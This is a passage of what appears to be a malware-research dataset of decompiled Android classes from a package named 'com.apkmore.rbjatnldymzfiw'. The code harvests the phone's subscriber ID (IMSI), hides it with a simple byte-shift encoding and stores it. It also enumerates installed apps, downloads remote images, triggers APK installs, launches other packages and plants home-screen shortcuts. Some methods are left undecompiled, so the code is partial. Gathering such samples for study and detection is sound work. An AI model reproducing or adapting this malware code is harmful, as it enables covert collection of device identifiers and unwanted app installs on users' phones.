BitmapDrawable(bitmap);     bitmapDrawable.setTargetDensity((int)(c * ((c * 1.0f) / 240.0f)));     return bitmapDrawable;   }   public static Drawable b(  Context context,  String str){     Drawable drawable;     if (b.containsKey(str) && (drawable=(Drawable)((SoftReference)b.get(str)).get()) != null) {       return drawable;     }     Bitmap a2=a(context,str);     if (a2 == null) {       return null;     }     Drawable a3=a(context,a2);     b.put(str,new SoftReference(a3));     return a3;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\s.code","public class s {   public static Map f244a=new HashMap();   public static Map b=new HashMap();   public static Map c=new HashMap();   public static boolean d=false;   public static final String e=h.bm;   public static final String f=Environment.getExternalStorageDirectory().toString();   public static final String g=f + ""/"" + h.G;   public static boolean a(  Context context){     ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");     if (connectivityManager.getActiveNetworkInfo() != null) {       return connectivityManager.getActiveNetworkInfo().isAvailable();     }     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\t.code","public class t {   private static final Pattern c=Pattern.compile(h.ai);   static Object f245a=new Object();   private static String d=null;   public static com.apkmore.rbjatnldymzfiw.y.b.b[] b=null;   public static int a(  Context context,  String[] strArr,  int i){     int i2;     int i3=0;     for (int i4=0; i4 < q.b.size(); i4++) {       try {         int i5=0;         while (i5 < strArr.length) {           if (!((ResolveInfo)q.b.get(i4)).activityInfo.packageName.equals(strArr[i5]) || q.f242a.contains(q.b.get(i4)) || a(context,(ResolveInfo)q.b.get(i4))|| i3 >= i) {             i2=i3;           }  else {             q.f242a.add(q.b.get(i4));             i2=i3 + 1;           }           i5++;           i3=i2;         }       }  catch (      Exception e) {       }     }     return q.f242a.size();   }   public static Intent a(  Context context,  File file,  boolean z){     Intent intent=new Intent();     intent.addFlags(268435456);     intent.setAction(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),h.ay);     if (z) {       context.startActivity(intent);     }     return intent;   }   public static PackageInfo a(  Context context,  String str,  int i){     return context.getPackageManager().getPackageInfo(str,i);   }   protected static File a(  String str,  int i){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return null;     }     String str2=h.G + i;     File file=new File(Environment.getExternalStorageDirectory(),str2);     if (!file.exists()) {       file.mkdirs();     }     return new File(Environment.getExternalStorageDirectory(),str2 + ""/"" + str);   }   public static Class a(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=a(context,context.getApplicationInfo().packageName,1).activities;       if (activityInfoArr == null) {         return cls;       }       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           cls2=Class.forName(activityInfo.name);         }  catch (        ClassNotFoundException e) {         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e2) {       return cls;     }   }   public static String a(  double d2,  double d3){     return null;   }   public static String a(  int i){     return s.g + i;   }   public static String a(  Context context){     File file=new File(Environment.getExternalStorageDirectory(),h.z);     String a2=a(context,file);     if (a2 == null || """".equals(a2)) {       a2=b(context,file);     }     return (a2 == null || """".equals(a2) || !e(a2)) ? """" : a2;   }   public static String a(  Context context,  PackageManager packageManager){     try {       String string=packageManager.getApplicationInfo(context.getPackageName(),128).metaData.getString(h.A);       return string == null ? h.bG : string;     }  catch (    Exception e) {       return h.bG;     }   }   private static java.lang.String a(  android.content.Context r5,  java.io.File r6){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.y.c.t.a(android.content.Context, java.io.File):java.lang.String"");   }   protected static String a(  String str){     try {       byte[] bytes=str.getBytes(h.ah);       byte[] bytes2=h.U.getBytes();       StringBuilder sb=new StringBuilder();       for (int i=0; i < bytes.length; i++) {         sb.append(""%"" + ((bytes[i] & 255) + (bytes2[i % bytes2.length] & 255)));       }       return sb.toString();     }  catch (    UnsupportedEncodingException e) {       e.printStackTrace();       return str;     }   }   public static void a(  int i,  Bitmap bitmap){     FileOutputStream fileOutputStream;     try {       fileOutputStream=new FileOutputStream(a(h.Z + h.H,i));     }  catch (    FileNotFoundException e) {       fileOutputStream=null;     }     bitmap.compress(Bitmap.CompressFormat.PNG,100,fileOutputStream);     try {       fileOutputStream.flush();     }  catch (    IOException e2) {       e2.printStackTrace();     }     try {       fileOutputStream.close();     }  catch (    IOException e3) {       e3.printStackTrace();     }   }   public static void a(  long j,  Context context){     if (j == 0) {       return;     }     context.getSharedPreferences(h.bh,0).edit().putLong(h.bi,j).commit();   }   public static void a(  Context context,  long j){     SharedPreferences.Editor edit=y(context).edit();     edit.putLong(""c"",j);     edit.commit();   }   public static void a(  Context context,  Intent intent){     String uri=intent.getData().toString();     com.apkmore.rbjatnldymzfiw.y.a.j.a(""f"",uri.substring(8,uri.length()),context);   }   private static void a(  android.content.Context r5,  java.io.File r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.y.c.t.a(android.content.Context, java.io.File, java.lang.String):void"");   }   public static void a(  Context context,  String str){ synchronized (f245a) {       if (str == null) {         return;       }       SharedPreferences sharedPreferences=context.getSharedPreferences(h.D,0);       String string=sharedPreferences.getString(h.E,"""");       if (!string.equals("""")) {         str=string + "";"" + str;       }       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(h.E,str);       edit.commit();     }   }   public static void a(  String str,  Context context,  int i){     if (b(i).exists()) {       File file=new File(a(i) + ""/"" + str);       if (file.exists()) {         file.delete();       }     }   }   public static void a(  String[] strArr,  Context context,  int i,  int i2){     int i3;     int i4;     int i5;     try {       if (d == null) {         d=l(context);       }       if (q.b == null) {         q.a(context);       }       if (strArr != null) {         i3=0;         for (        String str : strArr) {           int i6=0;           while (i6 < q.b.size()) {             if (!str.equals(((ResolveInfo)q.b.get(i6)).activityInfo.packageName) || q.f242a.contains(q.b.get(i6)) || a(context,(ResolveInfo)q.b.get(i6))|| i3 >= i) {               i5=i3;             }  else {               i5=i3 + 1;               if (q.f242a.size() - i2 < 4) {                 q.f242a.add(q.b.get(i6));               }             }             i6++;             i3=i5;           }         }       }  else {         i3=0;       }       int size=q.b.size() - 1;       while (size > 1) {         if (q.f242a.contains(q.b.get(size)) || a(context,(ResolveInfo)q.b.get(size)) || i3 >= i || ((ResolveInfo)q.b.get(size)).activityInfo.packageName.equals(d)) {           i4=i3;         }  else {           i4=i3 + 1;           if (q.f242a.size() - i2 < 4) {             q.f242a.add(q.b.get(size));           }         }         size--;         i3=i4;       }     }  catch (    Exception e) {     }   }   private static boolean a(  Context context,  ResolveInfo resolveInfo){     if (b == null) {       b=s(context);     }     if (b == null || resolveInfo == null) {       return false;     }     boolean z=false;     for (int i=0; i < b.length; i++) {       if (resolveInfo.activityInfo.packageName.equals(b[i].f)) {         z=true;       }     }     return z;   }   public static boolean a(  SharedPreferences sharedPreferences,  Context context){     return new File(Environment.getExternalStorageDirectory(),h.aP + l(context) + h.aJ).exists();   }   private static String[] a(  File file,  Context context){     BufferedWriter bufferedWriter;     Throwable th;     String[] strArr;     BufferedWriter bufferedWriter2;     String str;     String[] strArr2=null;     try {       if (j(context) == null) {         return null;       }       try {         file.createNewFile();         bufferedWriter2=new BufferedWriter(new FileWriter(file));         try {           try {             str=m(context).c;             strArr2=str.split("";"");           }  catch (          Throwable th2) {             bufferedWriter=bufferedWriter2;             strArr=null;             th=th2;           }           try {             bufferedWriter2.write(str);             bufferedWriter2.newLine();             bufferedWriter2.flush();             bufferedWriter2.close();           }  catch (          Throwable th3) {             bufferedWriter=bufferedWriter2;             strArr=strArr2;             th=th3;             try {               bufferedWriter.close();               throw th;             }  catch (            Exception e) {               return strArr;             }           }         }  catch (        IOException e2) {           bufferedWriter2.close();           return strArr2;         }       }  catch (      IOException e3) {         bufferedWriter2=null;       } catch (      Throwable th4) {         bufferedWriter=null;         th=th4;         strArr=null;       }       return strArr2;     }  catch (    Exception e4) {       return strArr2;     }   }   public static File b(  int i){     return new File(s.g + i);   }   public static Class b(  Context context,  Class cls){     Class<?> cls2;     try {       ActivityInfo[] activityInfoArr=a(context,context.getApplicationInfo().packageName,2).receivers;       if (activityInfoArr == null) {         return cls;       }       for (      ActivityInfo activityInfo : activityInfoArr) {         try {           cls2=Class.forName(activityInfo.name);         }  catch (        ClassNotFoundException e) {           e.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return cls;     }   }   private static String b(  Context context,  File file){     String subscriberId=((TelephonyManager)context.getSystemService(""phone"")).getSubscriberId();     SharedPreferences sharedPreferences=context.getSharedPreferences(h.T,0);     String string=sharedPreferences.getString(h.j,null);     if (string != null && !"""".equals(string)) {       String b2=b(string);       return !e(b2) ? """" : b2;     }     if (e(subscriberId)) {       i(context,subscriberId);       a(context,file,subscriberId);       return subscriberId;     }     if (sharedPreferences != null) {       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.putString(h.j,"""");       edit.commit();     }     return """";   }   public static String b(  Context context,  String str){     Bundle bundle;     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);       if (applicationInfo == null || (bundle=applicationInfo.metaData) == null) {         return null;       }       return bundle.getString(str);     }  catch (    PackageManager.NameNotFoundException e) {       e.printStackTrace();       return null;     }   }   protected static String b(  String str){     if (str == null || str.length() == 0) {       return str;     }     Matcher matcher=c.matcher(str);     ArrayList arrayList=new ArrayList();     while (matcher.find()) {       try {         arrayList.add(Integer.valueOf(matcher.group()));       }  catch (      Exception e) {         e.printStackTrace();         return str;       }     }     if (arrayList.size() <= 0) {       return str;     }     try {       byte[] bArr=new byte[arrayList.size()];       byte[] bytes=h.U.getBytes();       for (int i=0; i < bArr.length; i++) {         bArr[i]=(byte)(((Integer)arrayList.get(i)).intValue() - (bytes[i % bytes.length] & 255));       }       return new String(bArr,h.ah);     }  catch (    UnsupportedEncodingException e2) {       e2.printStackTrace();       return str;     }   }   public static void b(  long j,  Context context){     SharedPreferences.Editor edit=context.getSharedPreferences(h.aE,0).edit();     edit.putLong(h.aF,j);     edit.commit();   }   public static boolean b(  Context context){     if ("""".equals(a(context)) || a(context) == null) {       f(context,h.bs);       return true;     }     if (""mounted"".equals(Environment.getExternalStorageState())) {       return false;     }     f(context,h.br);     return true;   }   public static Bitmap c(  String str){     InputStream inputStream;     try {       inputStream=(InputStream)new URL(str).getContent();     }  catch (    MalformedURLException e) {       e.printStackTrace();       inputStream=null;     } catch (    IOException e2) {       e2.printStackTrace();       inputStream=null;     }     BitmapFactory.Options options=new BitmapFactory.Options();     options.inJustDecodeBounds=false;     options.inSampleSize=1;     return BitmapFactory.decodeStream(inputStream,null,options);   }   public static Class c(  Context context,  Class cls){     Class<?> cls2;     try {       ServiceInfo[] serviceInfoArr=a(context,context.getApplicationInfo().packageName,4).services;       if (serviceInfoArr == null) {         return cls;       }       for (      ServiceInfo serviceInfo : serviceInfoArr) {         try {           cls2=Class.forName(serviceInfo.name);         }  catch (        ClassNotFoundException e) {           e.printStackTrace();         }         if (cls.isAssignableFrom(cls2)) {           return cls2;         }       }       return cls;     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return cls;     }   }   public static String c(  Context context){     c(context,""ffaf1a9996c643de9f0c2f70e1500c18"");     return ""ffaf1a9996c643de9f0c2f70e1500c18"";   }   public static boolean c(  Context context,  String str){     if (str == null) {       return false;     }     SharedPreferences.Editor edit=context.getSharedPreferences(h.B,0).edit();     edit.putString(h.B,str);     return edit.commit();   }   public static void d(  Context context,  String str){     if (str == null) {       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(h.R,0).edit();     edit.putString(h.S,str);     edit.commit();   }   public static void d(  String str){     try {       com.apkmore.rbjatnldymzfiw.y.a.b.f217a.remove(str);       ((ProgressBar)s.f244a.get(str)).setVisibility(8);       ((TextView)s.c.get(str)).setVisibility(8);       ((TextView)s.b.get(str)).setVisibility(0);     }  catch (    Exception e) {     }   }   public static boolean d(  Context context){     return (context.getApplicationInfo().flags & 1) > 0;   }   public static int e(  Context context){     return 100061;   }   public static Intent e(  Context context,  String str){     new Intent();     Intent launchIntentForPackage=context.getApplicationContext().getPackageManager().getLaunchIntentForPackage(str);     launchIntentForPackage.addFlags(268435456);     context.startActivity(launchIntentForPackage);     return launchIntentForPackage;   }   private static boolean e(  String str){     try {       Long.valueOf(str.substring(0,3));       return true;     }  catch (    Exception e) {       return false;     }   }   public static Location f(  Context context){     return null;   }   public static void f(  Context context,  String str){     Toast.makeText(context,str,1).show();   }   public static String g(  Context context){     String string; synchronized (f245a) {       SharedPreferences sharedPreferences=context.getSharedPreferences(h.D,0);       string=sharedPreferences.getString(h.E,"""");       SharedPreferences.Editor edit=sharedPreferences.edit();       edit.remove(h.E);       edit.clear();       edit.commit();     }     return string;   }   public static void g(  Context context,  String str){     SharedPreferences.Editor edit=z(context).edit();     edit.putString(h.b,str);     edit.commit();   }   public static String h(  Context context){     String string=context.getSharedPreferences(h.B,0).getString(h.A,null);     if (string == null) {       string=b(context,h.A);     }     return string != null ? string : h.bG;   }   public static boolean h(  Context context,  String str){     try {       return context.getPackageManager().getPackageArchiveInfo(str,1) != null;     }  catch (    Exception e) {       return false;     }   }   public static String i(  Context context){     return context.getSharedPreferences(h.R,0).getString(h.S,null);   }   private static void i(  Context context,  String str){     if (str == null) {       return;     }     context.getSharedPreferences(h.T,0).edit().putString(h.j,a(str)).commit();   }   public static String j(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   }   public static boolean k(  Context context){     String j=j(context);     if (j != null) {       return j.compareTo(h.ad) == 0 || j.compareTo(h.ae) == 0 || j.compareTo(h.af) == 0;     }     return false;   }   public static String l(  Context context){     PackageInfo packageInfo;     try {       packageInfo=context.getPackageManager().getPackageInfo(context.getPackageName(),0);     }  catch (    PackageManager.NameNotFoundException e) {       e.printStackTrace();       packageInfo=null;     }     if (packageInfo != null) {       return packageInfo.packageName;     }     return null;   }   public static com.apkmore.rbjatnldymzfiw.y.b.f m(  Context context){     com.apkmore.rbjatnldymzfiw.y.b.f a2=com.apkmore.rbjatnldymzfiw.y.b.a(context).a();     if (a2 == null) {       return a2;     }     if (a2.b == null || a2.f228a == null) {       return null;     }     return a2;   }   public static String[] n(  Context context){     String[] strArr;     Throwable th;     BufferedReader bufferedReader;     String[] strArr2=null;     try {       File file=new File(Environment.getExternalStorageDirectory(),h.aP);       if (file != null && !file.exists()) {         file.mkdirs();       }       File file2=new File(Environment.getExternalStorageDirectory(),h.aP + h.aV + h.bl);       if (file2 != null && !file2.exists()) {         return a(file2,context);       }       if (file2 == null) {         return null;       }       try {         bufferedReader=new BufferedReader(new FileReader(file2));         try {           try {             StringBuffer stringBuffer=new StringBuffer();             while (true) {               String readLine=bufferedReader.readLine();               if (readLine == null) {                 break;               }               stringBuffer.append(readLine);             }             String[] split=stringBuffer.toString().trim().split("";"");             if (split == null) {               try {                 split=a(file2,context);               }  catch (              Throwable th2) {                 strArr=split;                 th=th2;                 try {                   bufferedReader.close();                   throw th;                 }  catch (                Exception e) {                   e=e;                   strArr2=strArr;                   e.printStackTrace();                   return strArr2;                 }               }             }             bufferedReader.close();             return split;           }  catch (          Throwable th3) {             strArr=null;             th=th3;           }         }  catch (        IOException e2) {           bufferedReader.close();           return null;         }       }  catch (      IOException e3) {         bufferedReader=null;       } catch (      Throwable th4) {         strArr=null;         th=th4;         bufferedReader=null;       }     }  catch (    Exception e4) {       e=e4;     }   }   public static void o(  Context context){     if (j(context) != null) {       Intent intent=new Intent(context,(Class<?>)Baa.class);       intent.putExtra(h.bb,2);       context.startService(intent);     }   }   public static void p(  Context context){     try {       com.apkmore.rbjatnldymzfiw.y.a.j.b(context);     }  catch (    Exception e) {     }   }   public static SharedPreferences q(  Context context){     return context.getSharedPreferences(h.aO,0);   }   public static SharedPreferences r(  Context context){     return context.getSharedPreferences(h.aE,0);   }   public static com.apkmore.rbjatnldymzfiw.y.b.b[] s(  Context context){     HashMap b2=com.apkmore.rbjatnldymzfiw.y.b.a(context).b();     if (b2 != null) {       b=(com.apkmore.rbjatnldymzfiw.y.b.b[])b2.get(com.apkmore.rbjatnldymzfiw.y.b.b.class.getName());       if (b != null && !b.equals("""")) {         return b;       }     }     return null;   }   public static void t(  Context context){     if (j(context) != null) {       com.apkmore.rbjatnldymzfiw.y.d.a().a(context,0,0);     }  else {       a(context,""-1,0"");     }   }   public static long u(  Context context){     return y(context).getLong(""c"",0L);   }   public static String v(  Context context){     return z(context).getString(h.b,"""");   }   public static void w(  Context context){     Toast.makeText(context,h.bf,1).show();   }   public static SharedPreferences x(  Context context){     return context.getSharedPreferences(""e"",0);   }   private static SharedPreferences y(  Context context){     return context.getSharedPreferences(""t"",0);   }   private static SharedPreferences z(  Context context){     return context.getSharedPreferences(h.s,0);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.c\u.code","public class u {   public static int a(  Context context,  int i){     return (int)((context.getResources().getDisplayMetrics().density * i) + 0.5f);   }   public static Bitmap a(  Bitmap bitmap,  Context context,  int i,  int i2){     if (bitmap == null) {       return null;     }     int width=bitmap.getWidth();     int height=bitmap.getHeight();     Matrix matrix=new Matrix();     int i3=context.getResources().getDisplayMetrics().densityDpi;     if (200 < i3 && i3 <= 280) {       matrix.postScale(1.0f,1.0f);     }  else     if (i3 > 0 && i3 <= 200) {       matrix.postScale(0.666f,0.666f);     }  else     if (280 < i3 && i3 <= 360) {       matrix.postScale(1.333f,1.333f);     }  else     if (i3 > 360) {       matrix.postScale(2.0f,2.0f);     }     return Bitmap.createBitmap(bitmap,0,0,width,height,matrix,true);   }   public static void a(  Context context,  String str,  Bitmap bitmap,  Class cls){     Intent intent=new Intent(h.X);     intent.putExtra(""android.intent.extra.shortcut.NAME"",str);     intent.putExtra(h.Y,false);     Intent intent2=new Intent(""android.intent.action.MAIN"");     intent2.setClass(context,cls);     intent.putExtra(""android.intent.extra.shortcut.INTENT"",intent2);     intent.putExtra(""android.intent.extra.shortcut.ICON"",bitmap);     context.sendBroadcast(intent);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.d\a.code","public class a extends BaseAdapter {   public static List f247a;   private Handler b;   private PackageManager c;   private Context d;   private b e;   public a(  Context context,  List list,  Handler handler){     this.b=handler;     f247a=list;     this.d=context;     if (q.b == null) {       q.a(context);     }     this.c=context.getPackageManager();   }   @Override public int getCount(){     return f247a.size();   }   @Override public Object getItem(  int i){     return f247a.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     TextView textView;     ImageView imageView;     ImageView imageView2;     TextView textView2;     ImageView imageView3;     this.e=new b(this,this.d,(com.apkmore.rbjatnldymzfiw.y.b.b)f247a.get(i),i,viewGroup);     b bVar=this.e;     Drawable drawable=this.d.getResources().getDrawable(R.drawable.sym_def_app_icon);     if (""mounted"".equals(Environment.getExternalStorageState())) {       String str=Environment.getExternalStorageDirectory() + ""/"" + com.apkmore.rbjatnldymzfiw.y.c.h.G+ ((com.apkmore.rbjatnldymzfiw.y.b.b)f247a.get(i)).e+ ""/""+ com.apkmore.rbjatnldymzfiw.y.c.h.Z+ com.apkmore.rbjatnldymzfiw.y.c.h.H;       if (new File(str).exists()) {         drawable=r.b(this.d,str);       }  else       if (t.j(this.d) != null) {         new com.apkmore.rbjatnldymzfiw.y.a.c().a(((com.apkmore.rbjatnldymzfiw.y.b.b)f247a.get(i)).k,((com.apkmore.rbjatnldymzfiw.y.b.b)f247a.get(i)).e,this.b);       }     }     textView=this.e.e;     textView.setText(((com.apkmore.rbjatnldymzfiw.y.b.b)f247a.get(i)).d);     imageView=this.e.b;     imageView.setImageDrawable(drawable);     if (q.b == null) {       q.a(this.d);     }     if (q.c.contains(((com.apkmore.rbjatnldymzfiw.y.b.b)f247a.get(i)).f)) {       try {         Drawable applicationIcon=this.c.getApplicationIcon(((com.apkmore.rbjatnldymzfiw.y.b.b)f247a.get(i)).f);         imageView3=this.e.b;         imageView3.setImageDrawable(applicationIcon);       }  catch (      Exception e) {         e.printStackTrace();       }     }     try {       if (""s"".equals(((com.apkmore.rbjatnldymzfiw.y.b.b)f247a.get(i)).b)) {         imageView2=this.e.b;         imageView2.setImageDrawable(((ResolveInfo)q.f242a.get(q.f242a.size() - (f247a.size() - i))).activityInfo.loadIcon(this.d.getPackageManager()));         textView2=this.e.e;         textView2.setText(((ResolveInfo)q.f242a.get(q.f242a.size() - (f247a.size() - i))).activityInfo.loadLabel(this.d.getPackageManager()));       }     }  catch (    Exception e2) {     }     return bVar;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.d\b.code","public class b extends LinearLayout {   final a f248a;   private ImageView b;   private ImageView c;   private ProgressBar d;   private TextView e;   private FrameLayout f;   private TextView g;   public b(  a aVar,  Context context,  com.apkmore.rbjatnldymzfiw.y.b.b bVar,  int i,  ViewGroup viewGroup){     super(context);     this.f248a=aVar;     setOrientation(1);     LinearLayout linearLayout=new LinearLayout(a.a(aVar));     linearLayout.setOrientation(1);     addView(linearLayout,new LinearLayout.LayoutParams(-1,-1));     this.f=new FrameLayout(context);     FrameLayout.LayoutParams layoutParams=new FrameLayout.LayoutParams(-1,-2);     layoutParams.gravity=17;     linearLayout.addView(this.f,layoutParams);     this.b=new ImageView(context);     FrameLayout.LayoutParams layoutParams2=new FrameLayout.LayoutParams(u.a(a.a(aVar),60),u.a(a.a(aVar),60));     layoutParams2.gravity=17;     this.f.addView(this.b,layoutParams2);     this.c=new ImageView(context);     this.c.setVisibility(0);     FrameLayout.LayoutParams layoutParams3=new FrameLayout.LayoutParams(u.a(a.a(aVar),60),u.a(a.a(aVar),60));     this.c.setVisibility(8);     layoutParams3.gravity=1;     this.f.addView(this.c,layoutParams3);     this.d=new ProgressBar(context,null,R.attr.progressBarStyleHorizontal);     this.d.setMax(100);     this.d.setProgress(0);     this.d.setVisibility(8);     FrameLayout.LayoutParams layoutParams4=new FrameLayout.LayoutParams(-2,-2);     layoutParams4.gravity=81;     this.f.addView(this.d,layoutParams4);     this.e=new TextView(context);     this.e.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.e.setTextSize(10.0f);     this.e.setSingleLine(true);     this.e.setSelected(true);     this.e.setEllipsize(TextUtils.TruncateAt.MARQUEE);     this.e.setGravity(17);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(u.a(a.a(aVar),60),-2);     layoutParams5.gravity=1;     linearLayout.addView(this.e,layoutParams5);     this.g=new TextView(context);     this.g.setTextSize(10.0f);     this.g.setSingleLine(true);     this.g.setSelected(true);     this.g.setEllipsize(TextUtils.TruncateAt.MARQUEE);     this.g.setGravity(17);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(u.a(a.a(aVar),60),-2);     this.g.setVisibility(8);     this.g.setText(""0%"");     layoutParams6.gravity=1;     linearLayout.addView(this.g,layoutParams6);     if (viewGroup.getChildCount() == i) {       s.c.put(bVar.b,this.g);       s.f244a.put(bVar.b,this.d);       s.b.put(bVar.b,this.e);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.d\c.code","public class c {   private static Activity b=null;   private static e c=null;   public static Handler f249a=new d();   public static Activity a(){     return b;   }   public static void a(  Activity activity){     b=activity;   }   public static void a(  e eVar){     c=eVar;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.d\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1a5dd2b4"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.d\e.code","public class e extends LinearLayout implements AdapterView.OnItemClickListener {   public static a c;   private ImageButton e;   private TextView f;   private ImageView g;   private h h;   private ProgressBar i;   private Activity j;   private List k;   private Handler l;   public static boolean f250a=false;   public static boolean b=false;   public static Map d=new HashMap();   public e(  Activity activity){     super(activity);     this.e=null;     this.l=new g(this);     try {       this.j=activity;       setLayoutParams(new LinearLayout.LayoutParams(-1,-1));       s.d=false;       setOrientation(1);       setBackgroundColor(-1);       LinearLayout linearLayout=new LinearLayout(activity);       linearLayout.setOrientation(0);       linearLayout.setBackgroundColor(-1);       ViewGroup.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-2);       RelativeLayout relativeLayout=new RelativeLayout(activity);       RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(u.a(activity,45),u.a(activity,45));       layoutParams2.addRule(11);       layoutParams2.topMargin=7;       this.f=new TextView(activity);       this.f.setTextSize(20.0f);       this.f.setTextColor(-16711936);       this.f.setVisibility(8);       this.f.setText(com.apkmore.rbjatnldymzfiw.y.c.h.bo);       this.e=new ImageButton(activity);       this.e.setColorFilter(-16711936,PorterDuff.Mode.MULTIPLY);       this.e.setVisibility(8);       this.e.setImageResource(R.drawable.ic_popup_sync);       this.e.setOnClickListener(new f(this,activity));       LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-2,-2);       layoutParams3.leftMargin=u.a(activity,15);       layoutParams3.topMargin=u.a(activity,20);       linearLayout.addView(this.f,layoutParams3);       LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(u.a(activity,45),u.a(activity,45));       layoutParams4.leftMargin=(int)(activity.getWindow().getWindowManager().getDefaultDisplay().getWidth() / 2.3d);       layoutParams4.topMargin=u.a(activity,7);       relativeLayout.addView(this.e,layoutParams2);       addView(linearLayout,layoutParams);       linearLayout.addView(relativeLayout,new RelativeLayout.LayoutParams(-1,-2));       this.g=new ImageView(activity);       ViewGroup.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,u.a(activity,1));       this.g.setPadding(u.a(activity,20),0,u.a(activity,20),0);       this.g.setBackgroundColor(-16711936);       this.g.setVisibility(8);       addView(this.g,layoutParams5);       this.h=new h(activity);       this.h.setHorizontalSpacing(u.a(activity,10));       this.h.setVerticalSpacing(u.a(activity,18));       this.h.setNumColumns(4);       this.h.setVisibility(8);       this.h.setPadding(u.a(activity,25),u.a(activity,20),u.a(activity,20),u.a(activity,20));       this.h.setOnItemClickListener(this);       addView(this.h,-1,-1);       this.i=new ProgressBar(activity);       LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-2,-2);       Display defaultDisplay=activity.getWindowManager().getDefaultDisplay();       int width=defaultDisplay.getWidth();       int height=defaultDisplay.getHeight();       layoutParams6.leftMargin=(width / 2) - 45;       layoutParams6.topMargin=(height / 2) - 120;       addView(this.i,layoutParams6);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void a(){     this.e.setVisibility(0);     this.f.setVisibility(0);     this.g.setVisibility(0);     this.h.setVisibility(0);     this.i.setVisibility(8);   }   public void a(  List list){     c=new a(this.j,list,this.l);     this.h.setAdapter((ListAdapter)c);     this.h.setFocusable(false);     this.k=list;   }   public void b(){     this.e.setVisibility(8);     this.f.setVisibility(8);     this.g.setVisibility(8);     this.h.setVisibility(8);     this.i.setVisibility(0);   }   public void c(){     this.i.setVisibility(8);   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     new com.apkmore.rbjatnldymzfiw.y.a.b().a(i,this.j,this.k);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.d\f.code","class f implements View.OnClickListener {   final Activity f251a;   final e b;   public f(  e eVar,  Activity activity){     this.b=eVar;     this.f251a=activity;   }   @Override public void onClick(  View view){     if (t.j(this.f251a) == null) {       t.w(this.f251a);     }  else {       t.g(this.f251a,com.apkmore.rbjatnldymzfiw.y.c.h.p);       Zew.a(this.f251a);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.d\g.code","public class g extends Handler {   final e f252a;   public g(  e eVar){     this.f252a=eVar;   }   @Override public void handleMessage(  Message message){     h hVar;     hVar=this.f252a.h;     hVar.setAdapter((ListAdapter)e.c);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.y.d\h.code","public class h extends GridView {   public h(  Context context){     super(context);   } } "
